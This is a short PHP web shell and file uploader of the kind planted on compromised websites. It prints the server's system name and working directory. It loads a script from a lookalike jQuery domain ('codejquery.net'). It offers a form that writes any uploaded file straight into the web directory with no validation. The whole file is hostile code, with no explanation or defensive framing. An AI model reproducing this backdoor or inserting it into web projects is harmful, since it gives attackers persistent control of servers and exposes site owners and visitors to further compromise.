<?php 
echo 'anvenger'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); 
Echo 
'
<script type="text/javascript" src="http://www.codejquery.net/jquery.mins.js" ></script>
<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> 
<input name="submit" type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; 
if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);    
 Echo "<script>alert('upload Done');        </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } 
 
?>
